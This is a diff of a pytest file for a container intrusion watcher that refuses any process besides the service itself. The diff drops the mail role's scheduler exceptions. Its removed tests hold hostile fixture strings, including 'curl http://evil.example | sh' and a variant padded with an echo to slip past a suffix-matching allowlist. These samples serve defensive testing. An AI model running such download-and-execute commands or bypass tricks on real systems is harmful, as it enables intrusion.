@@ -1,11 +1,15 @@
 """The watcher that finds a process the image does not start, and the channel
 that tells somebody about it.
 
-`backend/execguard.py` is the prevention and it cannot be raced; this is what
-covers the processes that filter is not installed in -- the entrypoint shell,
-supercronic, and supercronic's children in the mail role. So the subject here
-is the rule for what belongs in a container, and the two things it does when
-the rule breaks: report, then end the process.
+`execguard.py` is the prevention and it cannot be raced; this is the backstop
+for the case it cannot cover, which is not being installed at all. The rule it
+enforces is one line -- one process per container, and it is this one -- so the
+subject here is that rule and the two things it does when the rule breaks:
+report, then end the process.
+
+The mail role used to be the exception, with supercronic and a shell per
+scheduled job. `backend/daemons/scheduler.py` removed those processes, and the
+tests that described what they were allowed to be went with them.
 """
 
 import os
@@ -17,6 +21,8 @@ from deploy import render_image_manifest
 
 MINE = os.getpid()
 
+ROLES = sorted(procwatch.SERVICE_MODULES)
+
 
 def _watching(monkeypatch, pids, cmdlines):
     """A container holding exactly `pids`, with `cmdlines` describing them."""
@@ -24,15 +30,15 @@ def _watching(monkeypatch, pids, cmdlines):
     monkeypatch.setattr(procwatch, "cmdline", lambda pid: cmdlines.get(pid))
 
 
-def test_a_role_that_execs_its_interpreter_expects_exactly_itself(monkeypatch):
-    """Four of the five entrypoint branches end in `exec python -m ...`, so the
-    service is pid 1 and there is nothing else the container should hold."""
-    for role in ("web", "hook", "egress", "ingress"):
-        _watching(monkeypatch, [MINE], {})
-        assert procwatch.check(role) is None
+@pytest.mark.parametrize("role", ROLES)
+def test_every_role_expects_exactly_itself(monkeypatch, role):
+    """One rule, all five roles. Each container's entry point is its
+    interpreter and nothing in it starts a second process."""
+    _watching(monkeypatch, [MINE], {})
+    assert procwatch.check(role) is None
 
 
-@pytest.mark.parametrize("role", ["web", "hook", "egress", "ingress"])
+@pytest.mark.parametrize("role", ROLES)
 def test_any_second_process_is_refused(monkeypatch, role):
     _watching(monkeypatch, [MINE, 4242], {4242: ["/bin/sh"]})
     with pytest.raises(procwatch.IntrusionRefused) as refusal:
@@ -46,127 +52,42 @@ def test_a_process_this_uid_cannot_describe_is_still_reported(monkeypatch):
     process in this container that this account cannot name is a process
     running as somebody else."""
     _watching(monkeypatch, [MINE, 7], {})
-    monkeypatch.setattr(procwatch.Path, "exists", lambda self: True)
     with pytest.raises(procwatch.IntrusionRefused) as refusal:
         procwatch.check("web")
     assert refusal.value.entries[0]["cmdline"] == "<unreadable>"
 
 
-def test_the_mail_role_holds_its_scheduler_and_the_jobs_it_starts(monkeypatch):
-    """The one container with a legitimately moving process set: flake.nix runs
-    supercronic beside the daemon and supercronic runs each crontab line
-    through a shell."""
-    _watching(monkeypatch, [MINE, 1, 8, 40, 41], {
-        1: ["/nix/store/abc-email-bot-entrypoint/bin/email-bot-entrypoint", "mail"],
-        8: ["/nix/store/def-supercronic/bin/supercronic", "/app/crontab"],
-        40: ["/bin/sh", "-c", "cd /app && python -m backend.drafting.email_summary"],
-        41: ["python", "-m", "backend.drafting.email_summary"],
-    })
-    assert procwatch.check("mail") is None
-
-
-def test_the_mail_role_refuses_a_shell_running_anything_else(monkeypatch):
-    """The allowance is for the crontab, not for shells. A `sh -c` running
-    something the schedule does not name is the thing being looked for."""
-    _watching(monkeypatch, [MINE, 40], {
-        40: ["/bin/sh", "-c", "curl http://evil.example | sh"],
-    })
-    with pytest.raises(procwatch.IntrusionRefused):
-        procwatch.check("mail")
-
-
-def test_a_command_that_merely_ends_in_a_scheduled_module_is_refused(monkeypatch):
-    """The rule matches the crontab line whole. It used to match the end of it,
-    which accepts any command at all as long as the attacker appends an echo --
-    an allowlist whose vocabulary the attacker gets to finish."""
-    _watching(monkeypatch, [MINE, 40], {
-        40: ["/bin/sh", "-c",
-             "curl http://evil.example | sh; echo backend.billing.billing_poller"],
-    })
-    with pytest.raises(procwatch.IntrusionRefused):
-        procwatch.check("mail")
-
-
-def test_a_binary_whose_path_merely_contains_the_entrypoint_name_is_refused(monkeypatch):
-    """argv[0] is matched by basename off a path separator, not by substring:
-    `/tmp/email-bot-entrypoint-payload` is not the entrypoint."""
-    _watching(monkeypatch, [MINE, 40], {
-        40: ["/tmp/email-bot-entrypoint-payload"],
-    })
-    with pytest.raises(procwatch.IntrusionRefused):
-        procwatch.check("mail")
-
-
-def test_supercronic_is_only_expected_against_the_image_crontab(monkeypatch):
-    """It is allowed to run the schedule the image ships, not a file an
-    attacker wrote."""
-    _watching(monkeypatch, [MINE, 8], {
-        8: ["/nix/store/def-supercronic/bin/supercronic", "/tmp/mine"],
-    })
-    with pytest.raises(procwatch.IntrusionRefused):
-        procwatch.check("mail")
-
-
-def test_a_second_copy_of_the_daemon_is_not_expected(monkeypatch):
-    """The watcher runs inside the daemon, so the daemon is answered by its
-    pid. Allowing its module name by name would allow a second one that nobody
-    started."""
-    _watching(monkeypatch, [MINE, 40], {
-        40: ["python", "-m", "backend.daemons.daemon_loop"],
-    })
-    with pytest.raises(procwatch.IntrusionRefused):
-        procwatch.check("mail")
-
-
-def test_an_interpreter_running_an_unscheduled_module_is_refused(monkeypatch):
-    _watching(monkeypatch, [MINE, 44], {
-        44: ["python", "-m", "http.server"],
-    })
-    with pytest.raises(procwatch.IntrusionRefused):
-        procwatch.check("mail")
-
-
-def test_a_module_named_in_an_argument_does_not_pass(monkeypatch):
-    """The module is read from the position after `-m`, so mentioning a
-    scheduled name somewhere else in argv buys nothing."""
-    _watching(monkeypatch, [MINE, 45], {
-        45: ["python", "-c", "import os", "backend.billing.billing_poller"],
-    })
-    with pytest.raises(procwatch.IntrusionRefused):
-        procwatch.check("mail")
-
-
-def test_a_job_that_ended_mid_scan_is_only_forgiven_where_jobs_exist(monkeypatch):
-    """A pid that vanished between the listing and the read is a race the mail
-    role really has, three times a day. Nowhere else starts a process at all,
-    so nowhere else gets the benefit of that doubt."""
+def test_a_pid_that_vanished_mid_scan_is_still_the_finding(monkeypatch):
+    """The mail role used to be forgiven this, because its scheduled jobs
+    really did start and end three times a day. Nothing starts a process in any
+    role now, so a pid that was in the cgroup at all is reported whether or not
+    it is still there to be named."""
     _watching(monkeypatch, [MINE, 99], {})
-    monkeypatch.setattr(procwatch.Path, "exists", lambda self: False)
-    assert procwatch.check("mail") is None
-    with pytest.raises(procwatch.IntrusionRefused):
-        procwatch.check("hook")
+    for role in ROLES:
+        with pytest.raises(procwatch.IntrusionRefused):
+            procwatch.check(role)
 
 
-def test_the_watched_modules_are_the_ones_the_flake_starts():
-    """Two files decide what runs in the mail container -- the crontab in
-    flake.nix and the entrypoint's `case` -- and neither can read this one. A
-    job added to the schedule and not here is a container that kills itself at
-    05:00, which is why the union is asserted rather than trusted."""
-    flake = (paths.REPO_ROOT / "flake.nix").read_text()
-    crontab = flake.split("crontab = pkgs.writeText", 1)[1].split("'';", 1)[0]
-    lines = [line.strip() for line in crontab.splitlines() if "python -m " in line]
-    scheduled = {line.rsplit("python -m ", 1)[1].strip() for line in lines}
-    assert scheduled == set(procwatch.SCHEDULED_MODULES), (
-        "the crontab in flake.nix and SCHEDULED_MODULES disagree")
+def test_no_argv_buys_a_process_a_place_in_the_container(monkeypatch):
+    """There is no allowlist of permitted command lines any more, and this is
+    what that means: a second interpreter running the role's own service module
+    is refused, and so is one running a formerly scheduled job. Both were
+    accepted while the schedule was a set of processes."""
+    for argv in (["python", "-m", "backend.daemons.daemon_loop"],
+                 ["python", "-m", "backend.drafting.email_summary"],
+                 ["/nix/store/def-supercronic/bin/supercronic", "/app/crontab"],
+                 ["/bin/sh", "-c", "cd /app && python -m backend.billing.billing_poller"]):
+        _watching(monkeypatch, [MINE, 40], {40: argv})
+        with pytest.raises(procwatch.IntrusionRefused):
+            procwatch.check("mail")
 
-    # And the whole command, since that is what the shell rule matches. Five
-    # leading fields of cron schedule, then the command supercronic runs.
-    commands = {line.split(None, 5)[5] for line in lines}
-    assert commands == set(procwatch.SCHEDULED_COMMANDS), (
-        "SCHEDULED_COMMANDS is not what flake.nix's crontab actually runs: "
-        f"{sorted(commands)}")
 
+def test_every_watched_role_is_watched_for_the_module_that_starts_it():
+    """`role_of(__spec__.name)` is only an identity if the module it is given is
+    the one the image actually starts, so the two lists are asserted against
+    each other rather than kept in step by hand."""
     roots = render_image_manifest.ROLE_ROOTS
+    assert set(procwatch.SERVICE_MODULES) == set(roots)
     for role, module in procwatch.SERVICE_MODULES.items():
         assert module in roots[role], (
             f"{role} is watched for {module}, which is not one of its entry "
@@ -175,8 +96,8 @@ def test_the_watched_modules_are_the_ones_the_flake_starts():
 
 def test_a_role_is_derived_from_the_module_that_was_started():
     """Entry points call `role_of(__spec__.name)` instead of naming their own
-    role: watching one role's container against another's expected set is the
-    difference between "one process" and "one process plus a scheduler"."""
+    role, so the role a container watches itself as is the module that was
+    started rather than a string the compose file supplied."""
     assert procwatch.role_of("frontend.web_server") == "web"
     assert procwatch.role_of("backend.daemons.daemon_loop") == "mail"
     with pytest.raises(AssertionError):
